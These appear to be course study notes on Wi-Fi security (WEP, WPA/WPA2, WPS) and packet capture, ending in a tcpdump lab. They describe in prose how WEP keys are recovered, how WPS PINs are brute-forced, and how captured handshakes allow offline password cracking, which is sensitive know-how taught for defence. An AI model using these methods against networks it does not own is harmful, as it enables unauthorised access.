24-bit initialization vector or IV for short. It\'s a randomized bit of
data to avoid reusing the same encryption key between packets. Since
these bits of data are concatenated or joined, a 40-bit shared key
scheme uses a 64-bit key for encryption and the 104-bit scheme uses a
128-bit key. Originally, WEP encryption was limited to 64-bit only
because of US export restrictions placed on encryption technologies.

Play video starting at :3:19 and follow transcript3:19

Now once those laws were changed, 128-bit encryption became available
for use. The shared key was entered as either 10 hexadecimal characters
for 40-bit WEP, or 26 hex characters for 104-bit WEP. Each hex character
was 4-bits each. The key could also be specified by supplying 5 ASCII
characters or 13, each ASCII character representing 8-bits. But this
actually reduces the available keyspace to only valid ASCII characters
instead of all possible hex values. Since this is a component of the
actual key, the shared key must be exactly as many characters as
appropriate for the encryption scheme. WEP authentication originally
supported two different modes, Open System authentication and Shared Key
authentication. The open system mode didn\'t require clients to supply
credentials. Instead, they were allowed to authenticate and associate
with the access point. But the access point would begin communicating
with the client encrypting data frames with the pre-shared WEP key. If
the client didn\'t have the key or had an incorrect key, it wouldn\'t be
able to decrypt the frames coming from the access point or AP.

Play video starting at :4:34 and follow transcript4:34

It also wouldn\'t be able to communicate back to the AP.

Play video starting at :4:39 and follow transcript4:39

Shared key authentication worked by requiring clients to authenticate
through a four-step challenge response process. This basically has the
AP asking the client to prove that they have the correct key. Here\'s
how it works. The client sends an authentication request to the AP. The
AP replies with clear text challenge, a bit of randomized data that the
client is supposed to encrypt using the shared WEP key. The client
replies to the AP with the resulting ciphertext from encrypting this
challenge text. The AP verifies this by decrypting the response and
checking it against the plain text challenge text. If they match, a
positive response is sent back.

Play video starting at :5:20 and follow transcript5:20

Does anything jump out at you as potentially insecure in the scheme?
We\'re transmitting both the plain text and the ciphertext in a way that
exposes both of these messages to potential eavesdroppers. This opens
the possibility for the encryption key to be recovered by the attacker.

Play video starting at :5:38 and follow transcript5:38

A general concept in security and encryption is to never send the plain
text and ciphertext together, so that attackers can\'t work out the key
used for encryption. But WEP\'s true weakness wasn\'t related to the
authentication schemes, its use of the RC4 stream cipher and how the IVs
were used to generate encryption keys led to WEP\'s ultimate downfall.
The primary purpose of an IV is to introduce more random elements into
the encryption key to avoid reusing the same one. When using a stream
cipher like RC4, it\'s super important that an encryption key doesn\'t
get reused. This would allow an attacker to compare two messages
encrypted using the same key and recover information. But the encryption
key in WEP is just made up of the shared key, which doesn\'t change
frequently. It had 24-bits of randomized data, including the IV tucked
on to the end of it. This results in only a 24-bit pool where unique
encryption keys will be pulled from and used.

Play video starting at :6:41 and follow transcript6:41

Since the IV is made up of 24-bits of data, the total number of possible
values is not very big by modern computing standards. That\'s only about
17 million possible unique IVs, which means after roughly 5,000 packets,
an IV will be reused. When an IV is reused, the encryption key is also
reused.

Play video starting at :7:2 and follow transcript7:02

It\'s also important to call out that the IV is transmitted in plain
text. If it were encrypted, the receiver would not be able to decrypt
it. This means an attacker just has to keep track of IVs and watch for
repeated ones. The actual attack that lets an attacker recover the WEP
key relies on weaknesses in some IVs and how the RC4 cipher generates a
keystream used for encrypting the data payloads. This lets the attacker
reconstruct this keystream using packets encrypted using the weak IVs.
The details of the attack are outside what we\'ll cover in this course,
but the full paper detailing the attack is available in the
supplementary readings if you want to check it out.

Play video starting at :7:45 and follow transcript7:45

You could also take a look at open source tools that demonstrate this
attack in action, like Aircrack-ng or AirSnort, they can recover a WEP
key in a matter of minutes, it\'s kind of terrifying to think about. So
now you\'ve heard the technical reasons why WEP is inherently vulnerable
to attacks. In the next video, we\'ll talk about the solution that
replaced WEP. But before we get there, you might be asking yourself why
it\'s important to know WEP, since it\'s not recommended for use
anymore. Well, as an IT support specialist, you might encounter some
cases where legacy hardware is still running WEP. It\'s important to
understand the security implications of using this broken security
protocol so you can prioritize upgrading away from WEP. All right, now
let\'s dive into the replacement for WEP in the next video.

###### Let\'s Get Rid of WEP! WPA/WPA2

The replacement for WEP from the Wi-Fi Alliance was WPA or Wi-Fi
Protected Access. It was introduced in 2003 as a temporary measure while
the alliance finalized their specification for what would become WPA2
introduced in 2004. WPA was designed as a short-term replacement that
would be compatible with older WEP-enabled hardware with a simple
firmware update. This helped with user adoption because it didn\'t
require the purchase of new Wi-Fi hardware. To address the shortcomings
of WEP security, a new security protocol was introduced called TKIP or
the Temporal Key Integrity Protocol. TKIP implemented three new features
that made it more secure than WEP. First, a more secure key derivation
method was used to more securely incorporate the IV into the per packet
encryption key. Second, a sequence counter was implemented to prevent
replay attacks by rejecting out of order packets. Third, a 64-bit MIC or
Message Integrity Check was introduced to prevent forging, tampering, or
corruption of packets. TKIP still use the RC4 cipher as the underlying
encryption algorithm. But it addressed the key generation weaknesses of
WEP by using a key mixing function to generate unique encryption keys
per packet. It also utilizes 256 bit long keys. This key mixing function
incorporates the long live the Wi-Fi passphrase with the IV. This is
different compared to the simplistic concatenation of the shared key and
IV. Under WPA, the pre-shared key is the Wi-Fi password you share with
people when they come over and want to use your wireless network. This
is not directly used to encrypt traffic. It\'s used as a factor to
derive the encryption key. The passphrase is fed into the PBKDF2 or
Password-Based Key Derivation Function 2, along with the Wi-Fi networks
SSID as a salt. This is then run through the HMAC-SHA1 function 4096
times to generate a unique encryption key. The SSID salt is incorporated
to help defend against rainbow table attacks. The 4096 rounds of
HMAC-SHA1 Increase the computational power required for a brute force
attack. I should call out that the pre-shared key can be entered using
two different methods. A 64 character hexadecimal value can be entered,
or the 64 character value is used as the key, which is 64 hexadecimal
characters times four bits, which is 256 bits. The other option is to
use PBKDF2 function but only if entering ASCII characters as a
passphrase. If that\'s the case, the passphrase can be anywhere from
eight to 63 characters long. WPA2 improve WPA security even more by
implementing CCMP or Counter Mode CBC-MAC Protocol. WPA2 is the best
security for wireless networks currently available, so it\'s really
important to know as an I.T. Support Specialist. It\'s based on the AES
cipher finally getting away from the insecure RC4 cipher. The key
derivation process didn\'t change from WPA, and the pre-shared key
requirements are the same. Counter with CBC-MAC is a particular mode of
operation for block ciphers. It allows for authenticated encryption,
meaning data is kept confidential, and is authenticated. This is
accomplished using an authenticate, then encrypt mechanism. The CBC-MAC
digest is computed first. Then, the resulting authentication code is
encrypted along with the message using a block cipher. We\'re using AES
in this case, operating in counter mode. This turns a block cipher into
a stream cipher by using a random seed value along with an incrementing
counter to create a key stream to encrypt data with.

###### Security and WPA/WPA2

**2. WPA/WPA2: **WPA and WPA2 are very similar, the only difference
between them is the algorithm used to encrypt the information but both
encryptions work in the same way. WPA/WPA2 can be cracked in two ways

1\. If **WPS **feature is enabled then there is a high chance of
obtaining the key regardless of its complexity, this can be done by
exploiting a weakness in the WPS feature. WPS is used to allow users to
connect to their wireless network without entering the key, this is done
by pressing a WPS button on both the router and the device that they
want to connect, the authentication works using an **eight digit
pin,** hackers can brute force this pin in relatively short time (in an
average of 10 hours), once they get the right pin they can use a tool
called reaver to reverse engineer the pin and get the key, this is all
possible due to the fact that the WPS feature uses an easy pin (only 8
characters and only contains digits), so its not a weakness in WPA/WPA2,
its a weakness in a feature that can be enabled on routers that use
WPA/WPA2 which can be exploited to get the actual WPA/WPA2 key.

2\. If WPS is not enabled, then the only way to crack WPA/WPA2 is using
a dictionary attack, in this attack a list of passwords (dictionary) is
compared against a file (handshake file) to check if any of the
passwords is the actual key for the network, so if the password does not
exist in the wordlist then the attacker will not be able to find the
password.

**Conclusion:**

1.Do not use WEP encryption, as we seen how easy it is to crack it
regardless of the complexity of the password and even if there is nobody
connected to the network.

2\. Use WPA2 with a complex password, make sure the password contains
small letters, capital letters, symbols and numbers and;

3\. Ensure that the WPS feature is disabled as it can be used to crack
your complex WPA2 key by brute-forcing the easy WPS pin.

###### Types of WPA2

-   **WPA2 Personal** : Uses a pre-shared key (PSK) \[SOHO\].

-   **WpA2 Enterprise** : Uses an AAA server (Authentication,
    Authorization, Accounting) such as Radius. If Active Directory
    server is in use Radius can connect the AD server to auth as well.

![Diagram Description automatically generated with medium
confidence](media/image699.png){width="6.5in"
height="1.5770833333333334in"}

###### Four-Way Handshake process

Now, let\'s walk through the **Four-Way Handshake process** that
authenticates clients to the network. I should call out, that while you
might not encounter this in your day to day work, it\'s good to have a
grasp on how the authentication process works. It will help you
understand how WPA2 can be broken.

This process also generates the temporary encryption key that will be
used to encrypt data for this client. This process is called the
**Four-Way Handshake**, since it\'s made up of four exchanges of data
between the [client and AP]{.underline}. It\'s designed to allow an AP
to confirm that the client has the correct pairwise master key, or
**pre-shared key** (PSK) in a WPA-PSK setup without disclosing the PMK.
The PMK is a long live key and might not change for a long time. So [an
encryption key is derived from the PMK that\'s used for actual
encryption and decryption of traffic between a client and
AP]{.underline}. This key is called the **Pairwise Transient Key or
PTK**. The PTK is generating using the PMK, AP nonce, Client nonce, AP
MAC address, and Client MAC address. They\'re all concatenated together,
and run through a function. The AP and Client nonces are just random
bits of data generated by each party and exchanged. The MAC addresses of
each party would be known through the packet headers already, and both
parties should already have the correct PMK. With this information, the
PTK can be generated. This is different for every client to allow for
confidentiality between clients. The PTK is actually made up of five
individual keys, each with their own purpose. Two keys are used for
encryption and confirmation of EAPoL packets, and the encapsulating
protocol carries these messages. Two keys are used for sending and
receiving message integrity codes. And finally, there\'s a temporal key,
which is actually used to encrypt data. The AP will also transmit the
GTK or Groupwise Transient Key. It\'s encrypted using the EAPoL
encryption key contained in the PTK, which is used to encrypt multicast
or broadcast traffic. Since this type of traffic must be readable by all
clients connected to an AP, this GTK is shared between all clients.
It\'s updated and retransmitted periodically, and when a client
disassociates the AP. That\'s a lot to take in, so let\'s recap.

**The four messages exchanged in order are**, the AP, which sends a
nonce to the client, the Client, then sends its nonce to the AP, the AP,
sends the GTK, and the Client replies with an Ack confirming successful
negotiation.

![Diagram, timeline Description automatically
generated](media/image700.png){width="6.5in"
height="4.2659722222222225in"}

The WPA and WPA2 standard also introduce an 802.1x authentication to
Wi-Fi networks. It\'s usually called WPA2-Enterprise. The non-802.1x
configurations are called either WPA2-Personal or WPA2-PSK, since they
use a pre-shared key to authenticate clients. We won\'t rehash 802.1x
here since it operates similarly to 802.1x on wire networks, which we
covered earlier. The only thing different is that the AP acts as the
authenticator in this case. The back-end radius is still the
authentication server and the PMK is generated using components of the
EAP method chosen. While not a security feature directly, WPS or Wi-Fi
protected setup is a convenience feature designed to make it easier for
clients to join a WPA-PSK protected network. You might encounter WPS in
a small IT shop that uses commercial SOHO routers. It can be useful in
these smaller environments to make it easier to join wireless clients to
the wireless networks securely. But there are security implications to
having enabled that you should be aware of. The Wi-Fi Alliance
introduced WPS in 2006. It provides several different methods that allow
our wireless client to securely join a wireless network without having
to directly enter the pre-shared key. This facilitates the use of very
long and secure passphrases without making it unnecessarily complicated.
Can you imagine having to have your less technically inclined friends
and family enter a 63-character passphrase to use your Wi-Fi when they
come over? That probably wouldn\'t go so well. WPS simplifies this by
allowing for secure exchange of the SSID and pre-shared key. This is
done after authenticating or exchanging data using one of the four
supported methods. WPS supports PIN entry authentication, NFC or USB for
out-of-band exchange of the network details, or push-button
authentication. You\'ve probably seen the push-button mechanism. It\'s
typically a small button somewhere on the home router with two arrows
pointing counter-clockwise. The push-button mechanism works by requiring
a button to be pressed on both the AP side and the client side. This
requires physical proximity and a short window of time that the client
can authenticate with a button press of its own. The NFC and USB methods
just provide a different channel to transmit the details to join the
network. The PIN methods are really interesting and also where critical
flaw was introduced. The PIN authentication mechanism supports two
modes. In one mode, the client generates a PIN which is then entered
into the AP, and the other mode, the AP has a PIN typically hard-coded
into the firmware which is entered into the client. It\'s the second
mode that is vulnerable to an online brute force attack. Feel free to
dive deep into this by reading more about it in the supplementary
readings. The PIN authentication method uses PINs that are eight-digits
long, but the last digit is a checksum that\'s computed from the first
seven digits. This makes the total number of possible PINs 10 to the
seventh power or around 10 million possibilities. But the PIN is
authenticated by the AP in halves. This means the client will send the
first four digits to the AP, wait for a positive or negative response,
and then send the second half of the PIN if the first half was correct.
Did you see anything wrong with this scenario? We\'re actually reducing
the total possible valid PINs even more and making it even easier to
guess what the correct PIN is. The first half of the PIN being four
digits has about 10,000 possibilities. The second half, only three
digits because of the checksum value, has a maximum of only 1,000
possibilities. This means the correct PIN can be guessed in a maximum of
11,000 tries. It sounds like a lot, but it really isn\'t. Without any
rate limiting, an attacker could recover the PIN and the pre-shared key
in less than four hours. In response to this, the Wi-Fi Alliance revised
the requirements for the WPS specification, introducing a lockout period
of one minute after three incorrect PIN attempts. This increases the
maximum time to guess the PIN from four hours to less than three days.
That\'s easily in the realm of possibility for a determined and patient
attacker, but it gets worse. If your network is compromised using this
attack because the PIN is an unchanging element that\'s part of the AP
configuration, the attacker could just reuse the already recovered WPS
PIN to get the new password. This would happen even if you detected
unauthorized wireless clients on your network and changed your Wi-Fi
password. WPA2 is a really robust security protocol. It\'s built using
best in class mechanisms to prevent attacks and ensure the
confidentiality of the data it\'s protecting. Even so, it\'s susceptible
to some forms of attack.

**Cracking with deauth!**

The four-way authentication handshake that we covered earlier is
actually susceptible to an offline brute force attack. If an attacker
can manage to capture the four-way handshake process just for packets,
they can begin guessing the pre-shared key or PMK. They can take the
nonces and MAC addresses from the four-way handshake packets and
computing PTKs. Sends the message authentication code, secret keys are
included as part of the PTK. The correct PMK guess would yield a PTK
that successfully validates a MIC. This is a brute force or
dictionary-based attack, so it\'s dependent on the quality of the
password guesses. It does require a fair amount of computational power
to calculate the PMK from the passphrase guesses and SSID values. But
the bulk of the computational requirements lie in the PMK computation.
This requires 4096 iterations of a hashing function, which can be
massively accelerated through the use of GPU-accelerated computation and
cloud computing resources. Because of the bulk of the computations
involving computing the PMK, by incorporating the password guesses with
the SSIDs, it\'s possible to pre-compute PMKs in bulk for common SSIDs
and password combinations. This reduces the computational requirements
to deriving the PTK from the unique session elements. These pre-computed
sets are referred to as rainbow tables and exactly this has been done.
Rainbow tables are available for download for the top 1000 most commonly
seen SSIDs and 1 million passwords.

##### Network Monitoring with Packet Sniffing

Now, in order to monitor what type of traffic is on your network, you
need a mechanism to capture packets from network traffic for analysis
and potential logging.

-   **Passive Sniffing**: Just reading packets

-   **Active Sniffing**: Altering/Redirecting packets.

**Packet Sniffing** or Packet Capture, is a process of intercepting
network packets in their entirety for analysis. It\'s an invaluable tool
for IT support specialists to troubleshoot issues. There are lots of
tools that make this really easy to do. Before we dive into the details
of how to use them, let\'s cover some basic concepts of Packet Sniffing.
By default, network interfaces and the networking software stack on an
OS are going to behave like a well-mannered interface, They will only be
accepting and processing packets that are addressed with specific
interface address usually identified by a MAC address. If a packet with
a different destination address is encountered, the interface will just
drop the packet. But, if we wanted to capture all packets that an
interface is able to see, like when we\'re monitoring all network
traffic on a network segment, this behavior would be a pain for us. To
override this, we can place the interface into what\'s called
**Promiscuous Mode**.

**This is a special mode** for Ethernet network interfaces that
basically says, \"Give me all the packets.\" Instead of only accepting
and handling packets destined for its address, it will now accept and
process any packet that it sees. This is much more useful for network
analysis or monitoring purposes. I should also call out that admin or
root privileges are needed to place an interface into promiscuous mode
and to begin to capture packets. Details for various platforms on how to
get into promiscuous mode can be found in the supplemental reading
section. Many packet capture tools will handle this for you too. Another
super important thing to consider when you perform packet captures is
whether you have access to the traffic you like to capture and monitor.
Let\'s say you wanted to analyze all traffic between hosts connected to
a switch and your machine is also connected to a port on the switch.
What traffic would you be able to see in this case? Because this is a
switch, the only traffic you\'d be able to capture would be traffic from
your host or destined for your host. That\'s not very useful in letting
you analyze other hosts traffic. If the packets aren\'t going to be sent
to your interface in the first place, Promiscuous Mode won\'t help you
see them. But, if your machine was inserted between the uplink port of
the switch and the uplink device further upstream now you\'d have access
to all packets in and out of that local network segment. Enterprise
manage switches usually have a feature called Port Mirroring, which
helps with this type of scenario.

**Port Mirroring**, allows the switch to take all packets from a
specified port, port range, or the entire VLAN and mirror the packets to
a specified switch port. This lets you gain access to all packets
passing on a switch in a more convenient and secure way. There\'s
another handy though less advanced way that you can get access to
packets in a switched network environment.

You can insert a hub into the topology with the device or devices you\'d
like to monitor traffic on, connected to the hub and our monitoring
machine. Hubs are a quick and dirty way of getting packets mirrored to
your capture interface. They obviously have drawbacks though, like
reduced throughput and the potential for introducing collisions. If you
capture packets from a wireless network, the process is slightly
different. Promiscuous Mode applied to a wireless device would allow the
wireless client to process and receive packets from the network it\'s
associated with destined for other clients. But, if we wanted to capture
and analyze all wireless traffic that we\'re able to receive in the
immediate area, we can place our wireless interface into a mode called
monitor mode.

***[Monitor mode!!!]{.underline}***

**Monitor mode**, allows us to scan across channels to see all wireless
traffic being sent by APs and clients. It doesn\'t matter what networks
they\'re intended for and it wouldn\'t require the client device to be
associated or connected to any wireless network. To capture wireless
traffic, all you need is an interface placed into monitor mode. Just
like enabling promiscuous mode, this can be done with a simple command,
but usually, the tools used for wireless packet captures can handle the
enabling and disabling of the mode for you. You need to be near enough
to the AP and client to receive a signal, and then you can begin
capturing traffic right out of the air. There are a number of open
source wireless capture and monitoring utilities, like Aircrack-ng and
Kismet. It\'s important to call out that if a wireless network is
encrypted, you can still capture the packets, but you won\'t be able to
decode the traffic payloads without knowing the password for the
wireless network. So, now we\'re able to get access to some traffic we
like to monitor. So, what do we do next? We need tools to help us
actually do the capture and the analysis. We\'ll learn more about those
in the next lesson.

**[Common Packet Sniffers]{.underline}**

-   SolarWinds NetFlow Traffic Analyzer

-   ManageEngine OpManager

-   Azure Network Watcher

-   Wireshark

-   tcpdump

##### Handling sniffed data

###### Wireshark and tcpdump

Tcpdump is a super popular, lightweight command-line based utility that
you can use to capture and analyze packets. Tcpdump uses the open source
libpcap library. That\'s a very popular packet capture library that\'s
used in a lot of packet capture and analysis tools.

Tcpdump also supports writing packet captures to a file for later
analysis, sharing, or replaying traffic. It also supports reading packet
captures back from a file. Tcpdump\'s default operating mode is to
provide a brief packet analysis. It converts key information from layers
three and up into human readable formats. Then it prints information
about each packet to standard out, or directly into your terminal. It
does things like converting the source and destination IP addresses into
the dotted quad format we\'re most used to. And it shows the port
numbers being used by the communications.

Let\'s quickly walk through the output of a sample tcpdump.

![Text Description automatically
generated](media/image701.png){width="6.5in"
height="2.8097222222222222in"}

The first bit of information is fairly straightforward. It\'s a
timestamp that represents when the packet on this line was processed by
the kernel, in local time. Next the layer three protocol is identified,
in this case, it\'s IPv4. After this, the connection quad is shown. This
is the source address, source port, destination address, and destination
port.

Next, the TCP flags and the TCP sequence number are set on the packet,
if there are any.

This is followed by the ack number, TCP window size, then TCP options,
if there are any set. Finally we have payload size in bytes. Remember
these from a few lessons ago, when we covered networking? Tcpdump allows
us to actually inspect these values from packets directly. I want to
call out that tcpdump, by default, will attempt to resolve host
addresses to hostnames. It\'ll also replace port numbers with commonly
associated services that use these ports. You could override this
behavior with a -n flag.

It\'s also possible to view the actual raw data that makes up the
packet. This is represented as hexadecimal digits, by using the -x flag,
or capital X if you want the hex in ASCII interpretation of the data.

Remember that packets are just collections of data, or groupings of ones
and zeros. They represent information depending on the values of this
data, and where they appear in the data stream. Think back to packet
headers, and how those are structured and formatted. The view tcpdump
gives us lets us see the data that fits into the various fields that
make up the headers for layers in a packet.

Wireshark is another packet capture and analysis tool that you can use,
but it\'s way more powerful when it comes to application and packet
analysis, compared to tcpdump. It\'s a graphical utility that also uses
the libpcap library for capture and interpretation of packets. But it\'s
way more extensible when it comes to protocol and application analysis.

While tcpdump can do basic analysis of some types of traffic, like DNS
queries and answers, Wireshark can do way more. Wireshark can decode
encrypted payloads if the encryption key is known. It can identify and
extract data payloads from file transfers through protocols like SMB or
HTTP. Wireshark\'s understanding of application level protocols even
extends to its filter strings. This allows filter rules like finding
HTTP requests with specific strings in the URL, which would look like,
http.request.uri matches \"q=wireshark\". That filter string would
locate packets in our capture that contain a URL request that has the
specified string within it. In this case it would match a query
parameter from a URL searching for Wireshark. While this could be done
using tcpdump, it\'s much easier using Wireshark.

![Graphical user interface, text, application Description automatically
generated](media/image702.png){width="6.5in"
height="3.604861111111111in"}

Let\'s take a quick look at the Wireshark interface, which is divided
into thirds. The list of packets are up top, followed by the layered
representation of a selected packet from the list. Lastly the Hex and
ASCII representation of the selected packet are at the bottom. The
packet list view is color coded to distinguish between different types
of traffic in the capture. The color coded is user configurable, the
defaults are green for TCP packets, light blue for UDP traffic, and dark
blue for DNS traffic. Black also highlights problematic TCP packets,
like out of order, or repeated packets. Above the packet list pane, is a
display filter box, which allows complex filtration of packets to be
shown. This is different from capture filters, which follows the libpcap
standard, along with tcpdump. Wireshark\'s deep understanding of
protocols allows filtering by protocols, along with their specific
fields. Since there are over 2,000 protocols supported by Wireshark, we
won\'t cover them in detail. You may want to take a look at the
supplementary readings, which shows a broad range of protocols
understood by Wireshark. Not only does Wireshark have very handy
protocol handling infiltration, it also understands and can follow tcp
streams or sessions. This lets you quickly reassemble and view both
sides of a tcp session, so you can easily view the full two-way exchange
of information between parties. Some other neat features of Wireshark is
its ability to decode WPA and WEP encrypted wireless packets, if the
passphrase is known. It\'s also able to view Bluetooth traffic with the
right hardware, along with USB traffic, and other protocols like Zigbee.
It also supports file carving, or extracting data payloads from files
transferred over unencrypted protocols, like HTTP file transfers or FTP.
And it\'s able to extract audio streams from unencrypted VOIP traffic,
so basically \[LAUGH\] Wireshark is awesome.

You might be wondering how packet capturing analysis fits into security
at this point. Like logs analysis, traffic analysis is also an important
part of network security. Traffic analysis is done using packet captures
and packet analysis. Traffic on a network is basically a flow of
packets. Now being able to capture and inspect those packets is
important to understanding what type of traffic is flowing on our
networks that we\'d like to protect.

###### Lab: Introduction to tcpdump

**Using tcpdump**

Now, you\'ll perform some tasks using tcpdump, starting with basic usage
and working up to slightly more advanced topics.

###### Introduction

In this lab, you\'ll be introduced to tcpdump and some of its features.
Tcpdump is the premier network analysis tool for information security
and networking professionals. As an IT Support Specialist, having a
solid grasp of this application is essential if you want to understand
TCP/IP. Tcpdump will help you display network traffic in a way that\'s
easier to analyze and troubleshoot.

You\'ll have 60 minutes to complete this lab.

###### **What you\'ll do**

-   **Command basics:** You\'ll learn how to use tcpdump and what some
    of its flags do, as well as interpret the output.

-   **Packet captures:** You\'ll practice saving packet captures to
    files, and reading them back.

###### Basic Usage

We\'ll kick things off by introducing tcpdump and running it without any
options. Head\'s up that tcpdump does require root or administrator
privileges in order to capture traffic, so every command must begin
with sudo. At a minimum, you must specify an interface to listen on with
the -i flag. You may want to check what the primary network interface
name is using ip link. In this case, we\'ll be using the
interface eth0 for all the examples; this is not necessarily the
interface you\'d use on your own machine, though.

To use tcpdump to start listening for any packets on the interface,
enter the command below.

**Head\'s up**: This command will fill your terminal with a constant
stream of text as new packets are read. It won\'t stop until you
press **Ctrl+C**.

sudo tcpdump -i eth0

This will output some basic information about packets it sees directly
to standard out. It\'ll continue to do this until we tell it to stop.
Press **Ctrl+C** to stop the stream at any time.

You can see that once tcpdump exits, it prints a summary of the capture
performed, showing the number of packets captured, filtered, or dropped:

10:26:27.868546 IP
nginx-us-west1-b.c.qwiklabs-terminal-vms-prod-00.internal.46564 \>
987cae65f07e.5000: Flags \[P.\], seq 1:15, ack 14375, win 506, options
\[nop,nop,TS val 1540850423 ecr 3482513360\], length 14

\^C

527 packets captured

527 packets received by filter

0 packets dropped by kernel

By default, tcpdump will perform some basic protocol analysis. To enable
more detailed analysis, use the -v flag to enable more verbose output.
By default, tcpdump will also attempt to perform reverse DNS lookups to
resolve IP addresses to hostnames, as well as replace port numbers with
commonly associated service names. You can disable this behavior using
the -n flag. It\'s recommended that you use this flag to avoid
generating additional traffic from the DNS lookups, and to speed up the
analysis. To try this out, enter this command:

**Head\'s up**: This command will fill your terminal with a constant
stream of text as new packets are read. It won\'t stop until you
press **Ctrl+C**.

sudo tcpdump -i eth0 -vn

You can see how the output now provides more details for each packet:

172.19.0.2.46564 \> 172.17.0.2.5000: Flags \[.\], cksum 0xbb04
(correct), ack 11863, win 504, options \[nop,nop,TS val 1540898645 ecr
3482561595\], length 0

10:27:16.103384 IP (tos 0x0, ttl 63, id 28613, offset 0, flags \[DF\],
proto TCP (6), length 63)

172.19.0.2.46564 \> 172.17.0.2.5000: Flags \[P.\], cksum 0xacf9
(correct), seq 1:12, ack 11863, win 504, options \[nop,nop,TS val
1540898650 ecr 3482561595\], length 11

10:27:16.103391 IP (tos 0x0, ttl 64, id 11488, offset 0, flags \[DF\],
proto TCP (6), length 52)

172.17.0.2.5000 \> 172.19.0.2.46564: Flags \[.\], cksum 0x584f
(incorrect -\> 0xbaf1), ack 12, win 501, options \[nop,nop,TS val
3482561601 ecr 1540898650\], length 0

\^C

306 packets captured

306 packets received by filter

0 packets dropped by kernel

Without the verbose flag, tcpdump only gives us:

-   the layer 3 protocol, source, and destination addresses and ports

-   TCP details, like flags, sequence and ack numbers, window size, and
    options

With the verbose flag, you also get all the details of the IP header,
like time-to-live, IP ID number, IP options, and IP flags.

**Filtering**

Let\'s explore tcpdump\'s filter language a bit next, along with the
protocol analysis. Tcpdump supports a powerful language for filtering
packets, so you can capture only traffic that you care about or want to
analyze. The filter rules go at the very end of the command, after all
other flags have been specified. We\'ll use filtering to only capture
DNS traffic to a specific DNS server. Then, we\'ll generate some DNS
traffic, so we can demonstrate tcpdump\'s ability to interpret DNS
queries and responses.

Go ahead and enter the following command now.

sudo tcpdump -i eth0 -vn host 8.8.8.8 and port 53 &

Let\'s analyze how this filter is constructed, and what exactly it\'s
doing. Host 8.8.8.8 specifies that we only want packets where the source
or destination IP address matches what we specify (in this case
8.8.8.8). If we only want traffic in one direction, we could also add a
direction qualifier, like dst or src (for the destination and source IP
addresses, respectively). However, leaving out the direction qualifier
will match traffic in either direction.

Next, the port 53 portion means we only want to see packets where the
source or destination port matches what we specify (in this case, DNS).
These two filter statements are joined together with the logical
operator \"and\". This means that both halves of the filter statement
must be true for a packet to be captured by our filter.

To move ahead, hit **Enter**.

To list all running jobs, use the following command:

jobs -l

\[1\]+ 618 Running sudo tcpdump -i eth0 -vn host 8.8.8.8 and port 53 &

Now, note down the **job ID** of the above process, in your local text
editor.

Next, execute the following command.

dig \@8.8.8.8 A example.com

You should see this output to the screen.

10:30:18.461037 IP (tos 0x0, ttl 64, id 11001, offset 0, flags \[none\],
proto UDP (17), length 80)

172.17.0.2.35281 \> 8.8.8.8.53: 5649+ \[1au\] A? example.com. (52)

10:30:18.462607 IP (tos 0x80, ttl 114, id 43094, offset 0, flags
\[none\], proto UDP (17), length 84)

8.8.8.8.53 \> 172.17.0.2.35281: 5649\$ 1/0/1 example.com. A
93.184.216.34 (56)

; \<\<\>\> DiG 9.11.5-P4-5.1+deb10u5-Debian \<\<\>\> \@8.8.8.8 A
example.com

; (1 server found)

;; global options: +cmd

;; Got answer:

;; -\>\>HEADER\<\<- opcode: QUERY, status: NOERROR, id: 5649

;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:

; EDNS: version: 0, flags:; udp: 512

;; QUESTION SECTION:

;example.com. IN A

;; ANSWER SECTION:

example.com. 1868 IN A 93.184.216.34

;; Query time: 2 msec

;; SERVER: 8.8.8.8#53(8.8.8.8)

;; WHEN: Wed Aug 11 10:30:18 UTC 2021

;; MSG SIZE rcvd: 56

This uses the dig utility to query a specific DNS server (in this case
8.8.8.8), asking it for the A record for the specified domain (in this
case \"example.com\").

Once that\'s done, use the **job ID** (that you\'ve noted down earlier)
to bring the process to foreground with the following command:

fg % \[job-id\]

Copied!

content_copy

To stop this process, hit **Ctrl+C**.

sudo tcpdump -i eth0 -vn host 8.8.8.8 and port 53

\^C

2 packets captured

2 packets received by filter

0 packets dropped by kernel

Now, you will see two captured packets, as our filter rules should
filter out any other traffic.

The first one is the DNS query, which is our question (from the process
running on the terminal) going to the server. Note that, in this case,
the traffic is UDP. Tcpdump\'s analysis of the DNS query begins right
after the UDP checksum field. It starts with the DNS ID number, followed
by some UDP options, then the query type (in this case A? which means
we\'re asking for an A record). Next is the domain name we\'re
interested in (example.com).

The second packet is the response from the server, which includes the
same DNS ID from the original query, followed by the original query.
After this is the answer to the query, which contains the IP address
associated with the domain name.

Up next, we\'ll explore tcpdump\'s ability to write packet captures to a
file, then read them back from a file.

###### Saving Captured Packets

In the terminal, run this command:

sudo tcpdump -i eth0 port 80 -w http.pcap &

This starts a capture on our eth0 interface that filters for only HTTP
traffic by specifying port 80. The -w flag indicates that we want to
write the captured packets to a file named http.pcap.

Once that\'s running in the background, now generate some http traffic
that\'ll be captured in the terminal. Don\'t stop the capture you
started with the previous command just yet. (If you have, you can
restart it now.)

To move ahead, hit **Enter**.

To list all running jobs, use the following command:

jobs -l

\[1\]+ 648 Running sudo tcpdump -i eth0 port 80 -w http.pcap &

Now, note down the **job ID** of the above process, in your local text
editor.

Now, execute the following command to generate some traffic:

curl example.com

Copied!

content_copy

This command fetches the html from example.com and prints it to your
screen. It should look like the below. (Head\'s up that only the first
part of the output is shown here.)

\<!doctype html\>

\<html\>

\<head\>

\<title\>Example Domain\</title\>

\<meta charset=\"utf-8\"/\>

\<meta http-equiv=\"Content-type\" content=\"text/html;
charset=utf-8\"/\>

\<meta name=\"viewport\" content=\"width=device-width,
initial-scale=1\"/\>

\<style type=\"text/css\"\>

body {

background-color: #f0f0f2;

margin: 0;

padding: 0;

font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\",
\"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;

}

div {

width: 600px;

margin: 5em auto;

padding: 2em;

background-color: #fdfdff;

border-radius: 0.5em;

box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);

}

a:link, a:visited {

color: #38488f;

text-decoration: none;

}

\@media (max-width: 700px) {

div {

margin: 0 auto;

width: auto;

}

}

\</style\>

\</head\>

\<body\>

\<div\>

\<h1\>Example Domain\</h1\>

\<p\>This domain is for use in illustrative examples in documents. You
may use this

domain in literature without prior coordination or asking for
permission.\</p\>

